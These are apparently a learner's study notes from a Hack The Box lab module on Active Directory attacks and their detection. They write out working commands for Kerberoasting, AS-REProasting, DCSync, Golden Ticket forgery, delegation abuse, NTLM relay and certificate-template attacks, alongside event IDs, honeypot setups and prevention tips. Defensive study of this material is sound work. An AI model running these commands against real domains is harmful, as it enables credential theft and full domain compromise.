# 🛡️ Windows Attacks & Defense — HTB Academy Notes

> **Module**: Windows Attacks & Defense  
> **Platform**: Hack The Box Academy  
> **Difficulty**: Medium  
> **Tags**: `Active Directory` `Kerberos` `Red Team` `Blue Team` `Detection` `Threat Hunting`

---

## 📋 Table of Contents

1. [Kerberoasting](#1-kerberoasting)
2. [AS-REProasting](#2-as-reproasting)
3. [Credentials in Object Properties](#3-credentials-in-object-properties)
4. [GPP Passwords](#4-gpp-passwords)
5. [Credentials in Shares](#5-credentials-in-shares)
6. [DCSync](#6-dcsync)
7. [Golden Ticket](#7-golden-ticket)
8. [Kerberos Constrained Delegation](#8-kerberos-constrained-delegation)
9. [Print Spooler & NTLM Relaying](#9-print-spooler--ntlm-relaying)
10. [Coercing Attacks & Unconstrained Delegation](#10-coercing-attacks--unconstrained-delegation)
11. [Object ACLs](#11-object-acls)
12. [PKI — ESC1 & ESC8](#12-pki--esc1--esc8)
13. [Windows Event IDs Reference](#13-windows-event-ids-reference)
14. [Key Takeaways](#14-key-takeaways)

---

## 1. Kerberoasting

### 🔍 What is it?
A post-exploitation attack targeting **service accounts** in Active Directory. Any authenticated domain user can request a **Kerberos TGS ticket** for any account with an SPN. The ticket is encrypted with the service account's NTLM hash — meaning it can be cracked **offline**.

### ⚙️ How it Works
```
Attacker (authenticated user)
    → Requests TGS ticket for SPN-registered account
    → Receives ticket encrypted with service account's NTLM hash
    → Cracks hash offline with hashcat/john
    → Recovers plaintext password
```

### 🔴 Attack Commands

**Extract tickets with Rubeus:**
```powershell
.\Rubeus.exe kerberoast /outfile:spn.txt
```

**Crack with Hashcat:**
```bash
hashcat -m 13100 -a 0 spn.txt passwords.txt --outfile="cracked.txt"
```

**Crack with John the Ripper:**
```bash
sudo john spn.txt --fork=4 --format=krb5tgs --wordlist=passwords.txt --pot=results.pot
```

### 🔵 Detection
| Event ID | Description |
|----------|-------------|
| `4769` | Kerberos TGS ticket requested |

**Detection tips:**
- Alert on **10+ Event 4769s** from same source within 1 minute
- Alert on **RC4 encryption** (0x17) tickets in AES-only environments
- Group alerts by requesting user AND source machine

### 🍯 Honeypot Strategy
Create a fake service account (`svc-iam`) with:
- Old creation date (2+ years)
- Old password (2+ years unchanged)
- Legitimate-looking SPN (e.g., `http/server1`)
- Some privileges (to look attractive)
- **Any 4769 for this account = immediate alert**

### 🛡️ Prevention
- Service account passwords should be **100+ random characters**
- Use **Group Managed Service Accounts (GMSA)** wherever possible
- Remove unused SPNs regularly
- Prefer **AES over RC4** encryption

---

## 2. AS-REProasting

### 🔍 What is it?
Targets accounts with **"Do not require Kerberos pre-authentication"** enabled. Without pre-auth, the KDC returns an AS-REP encrypted with the user's hash — crackable offline. No credentials needed to perform this attack.

### ⚙️ How it Works
```
Attacker
    → Sends AS-REQ without pre-authentication for target user
    → KDC responds with AS-REP (encrypted with user's hash)
    → Cracks hash offline
    → Recovers plaintext password
```

### 🔴 Attack Commands

**Extract hashes with Rubeus:**
```powershell
.\Rubeus.exe asreproast /outfile:asrep.txt
```

**Fix hash format (add 23$ after $krb5asrep$):**
```bash
sed -i 's/\$krb5asrep\$/\$krb5asrep\$23\$/' asrep.txt
```

**Crack with Hashcat:**
```bash
hashcat -m 18200 -a 0 asrep.txt passwords.txt --outfile asrepcrack.txt --force
```

### 🔵 Detection
| Event ID | Description |
|----------|-------------|
| `4768` | Kerberos TGT requested |

**Detection tips:**
- Look for **Pre-Authentication Type: 0** (no pre-auth) in event
- Alert on **RC4 encryption** (0x17) in Ticket Encryption Type
- Correlate client IP with known-good VLANs

### 🍯 Honeypot Strategy
Configure `svc-iam` with pre-auth disabled:
- Old account, old password, recent login history
- Has privileges (looks valuable)
- **Any 4768 with Pre-Auth Type 0 for this account = alert**

### 🛡️ Prevention
- Only enable "Do not require Kerberos pre-authentication" when **absolutely necessary**
- Quarterly review of accounts with this property
- Enforce **20+ character passwords** for affected accounts

---

## 3. Credentials in Object Properties

### 🔍 What is it?
Admins sometimes store passwords in the **Description** or **Info** fields of AD objects, mistakenly thinking only admins can read them. In reality, **any domain user** can read these fields.

### 🔴 Attack Commands

**Search for credentials in object properties:**
```powershell
# Load and run the SearchUser script
Import-Module .\SearchUser.ps1
SearchUserClearTextInformation -Terms "pass"
```

**Manual PowerShell alternative:**
```powershell
Get-ADUser -Filter * -Properties Description,Info | 
    Where-Object {$_.Description -like "*pass*" -or $_.Info -like "*pass*"} | 
    Select SamAccountName,Description,Info
```

### 🔵 Detection
| Event ID | Description |
|----------|-------------|
| `4624` | Successful logon |
| `4625` | Failed logon |
| `4768` | Kerberos TGT requested |

**Detection tips:**
- Baseline normal behavior for service/admin accounts
- Alert on logons from unusual IPs or outside business hours

### 🍯 Honeypot Strategy
Create a fake service account with a **wrong password** in Description:
- Account enabled with recent logon history
- Password last changed 2+ years ago
- **Alert on 4625, 4771, 4776** (failed logon attempts)

### 🛡️ Prevention
- Never store credentials in AD object properties
- Quarterly AD object audits
- Automate account creation to reduce manual handling
- Educate privileged users

---

## 4. GPP Passwords

### 🔴 Attack Commands
```powershell
# Import and run Get-GPPPassword
Import-Module .\Get-GPPPassword.ps1
Get-GPPPassword
```

**Bypass execution policy if needed:**
```powershell
Set-ExecutionPolicy Unrestricted -Scope CurrentUser
```

---

## 5. Credentials in Shares

### 🔴 Attack Commands
```powershell
# Load PowerView
Import-Module .\PowerView.ps1

# Find accessible shares
Invoke-ShareFinder -domain eagle.local -ExcludeStandard -CheckShareAccess

# Search for credentials in PS1 files
findstr /m /s /i "eagle" *.ps1
```

---

## 6. DCSync

### 🔍 What is it?
Simulates Domain Controller replication to extract **NTLM hashes** of any account, including `krbtgt` and `Administrator`. Requires **Replicating Directory Changes** privileges.

### 🔴 Attack Commands

**Run as privileged user:**
```powershell
runas /user:eagle\rocky cmd.exe
```

**Mimikatz DCSync:**
```
mimikatz # lsadump::dcsync /domain:eagle.local /user:Administrator
```

### 🔵 Detection
| Event ID | Description |
|----------|-------------|
| `4662` | Object operation performed — possible DCSync |

**Detection tip:** If the account name in 4662 is **not a Domain Controller**, it's highly suspicious.

---

## 7. Golden Ticket

### 🔍 What is it?
Forges a **Kerberos TGT** using the `krbtgt` account hash. Valid for any user, any service — essentially **permanent domain admin** until `krbtgt` password is reset (twice).

### 🔴 Attack Commands

**Get krbtgt hash:**
```
mimikatz # lsadump::dcsync /domain:eagle.local /user:krbtgt
```

**Get domain SID:**
```powershell
Get-DomainSID
```

**Forge the ticket:**
```
mimikatz # golden /domain:eagle.local /sid:<domain_sid> /rc4:<rc4_hash> /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt
```

**Verify ticket:**
```powershell
klist
```

---

## 8. Kerberos Constrained Delegation

### 🔍 What is it?
If a service account is trusted for delegation, an attacker can **impersonate any user** to any service the account is trusted to delegate to.

### 🔴 Attack Commands

**Find accounts trusted for delegation:**
```powershell
Get-NetUser -TrustedToAuth
```

**Convert password to hash:**
```powershell
.\Rubeus.exe hash /password:Slavi123
```

**Request impersonation ticket:**
```powershell
.\Rubeus.exe s4u /user:webservice /rc4:<hash> /domain:eagle.local /impersonateuser:Administrator /msdsspn:"http/dc1" /dc:dc1.eagle.local /ptt
```

**Access target:**
```powershell
Enter-PSSession dc1
```

### 🔵 Detection
| Event ID | Description |
|----------|-------------|
| `4624` | Logon — S4U extension indicates delegation |

---

## 9. Print Spooler & NTLM Relaying

### 🔍 What is it?
Abuses the **Print Spooler** service to coerce a DC into authenticating to an attacker-controlled host, then **relays the NTLM authentication** to perform DCSync.

### 🔴 Attack Commands

**Set up NTLM relay:**
```bash
impacket-ntlmrelayx -t dcsync://172.16.18.4 -smb2support
```

**Trigger PrinterBug:**
```bash
python3 ./dementor.py 172.16.18.20 172.16.18.3 -u bob -d eagle.local -p Slavi123
```

### 🛡️ Prevention
Disable via registry:
```
RegisterSpoolerRemoteRpcEndPoint
```

---

## 10. Coercing Attacks & Unconstrained Delegation

### 🔴 Attack Commands

**Find unconstrained delegation systems:**
```powershell
Get-NetComputer -Unconstrained | select samaccountname
```

**Monitor for incoming TGTs:**
```powershell
.\Rubeus.exe monitor /interval:1
```

**Coerce DC to authenticate:**
```bash
Coercer -u bob -p Slavi123 -d eagle.local -l ws001.eagle.local -t dc1.eagle.local
```

---

## 11. Object ACLs

### 🔴 Attack Commands

```powershell
# Remove an SPN
setspn -D http/ws001 anni

# Add a new SPN
setspn -U -s ldap/ws001 anni

# Add SPN to machine account
setspn -S ldap/server02 server01
```

---

## 12. PKI — ESC1 & ESC8

### ESC1 — Vulnerable Certificate Template

```powershell
# Find vulnerable templates
.\Certify.exe find /vulnerable

# Request certificate as Administrator
.\Certify.exe request /ca:PKI.eagle.local\eagle-PKI-CA /template:UserCert /altname:Administrator

# Convert to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Get TGT with forged cert
.\Rubeus.exe asktgt /domain:eagle.local /user:Administrator /certificate:cert.pfx /dc:dc1.eagle.local /ptt
```

### ESC8 — NTLM Relay to ADCS

```bash
# Relay to CA
impacket-ntlmrelayx -t http://172.16.18.15/certsrv/default.asp --template DomainController -smb2support --adcs

# Trigger coercion
python3 ./dementor.py 172.16.18.20 172.16.18.4 -u bob -d eagle.local -p Slavi123
```

### 🔵 Detection
| Event ID | Description |
|----------|-------------|
| `4886` | Certificate requested |
| `4887` | Certificate issued |

```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID='4887'}
```

---

## 13. Windows Event IDs Reference

| Event ID | Description | Associated Attack |
|----------|-------------|-------------------|
| `4624` | Successful logon | Delegation (S4U) |
| `4625` | Failed logon | Credential stuffing / Honeypot |
| `4662` | Object operation | DCSync |
| `4738` | User account changed | Honeypot modification |
| `4742` | Computer account changed | — |
| `4768` | Kerberos TGT requested | AS-REProasting |
| `4769` | Kerberos TGS requested | Kerberoasting |
| `4771` | Kerberos pre-auth failed | Failed AS-REP |
| `4776` | Credential validation | NTLM auth failure |
| `4725` | User account disabled | — |
| `4886` | Certificate requested | ESC1/ESC8 |
| `4887` | Certificate issued | ESC1/ESC8 |
| `5136` | GPO modified | GPO abuse |

---

## 14. Key Takeaways

### 🔴 Attacker Mindset
- Most AD attacks exploit **misconfigurations**, not vulnerabilities
- Kerberos ticket attacks are **offline** — no lockouts, no noise
- Once you have `krbtgt` hash → **game over** until double-reset
- Delegation misconfigurations are extremely common and powerful

### 🔵 Defender Mindset
- **Baselining is everything** — you can't detect anomalies without a baseline
- High-volume events (4769, 4768) need **contextual filtering** to be useful
- **Honeypot accounts** give near-zero false-positive alerts
- Don't implement every honeypot — too many traps reveals your playbook
- GMSA accounts eliminate Kerberoasting risk entirely for supported services

### 🍯 Honeypot Quick Reference
| Account | Attack Detected | Alert Event |
|---------|----------------|-------------|
| `svc-iam` (SPN set) | Kerberoasting | 4769 |
| `svc-iam` (no pre-auth) | AS-REProasting | 4768 |
| `svc-iis` (wrong pass in Description) | Credential Object Abuse | 4625, 4771, 4776 |

---

## 🔧 Tools Used

| Tool | Purpose |
|------|---------|
| `Rubeus.exe` | Kerberos ticket extraction & manipulation |
| `Mimikatz` | Hash dumping, DCSync, Golden Ticket |
| `Hashcat` | Offline hash cracking |
| `John the Ripper` | Offline hash cracking |
| `PowerView` | AD enumeration |
| `Certify.exe` | PKI vulnerability scanning |
| `impacket-ntlmrelayx` | NTLM relay attacks |
| `Coercer` | Authentication coercion |
| `dementor.py` | PrinterBug trigger |

---

## 📚 References

- [HTB Academy — Windows Attacks & Defense](https://academy.hackthebox.com)
- [Rubeus GitHub](https://github.com/GhostPack/Rubeus)
- [Mimikatz GitHub](https://github.com/gentilkiwi/mimikatz)
- [Impacket GitHub](https://github.com/fortra/impacket)
- [RFC 4120 — Kerberos Protocol](https://www.rfc-editor.org/rfc/rfc4120)
- [SpecterOps — Kerberoasting](https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1)

---

*📝 Notes compiled while completing the HTB Academy Windows Attacks & Defense module.*  
*🔗 [My HTB Profile](https://app.hackthebox.com) | [GitHub](https://github.com)*
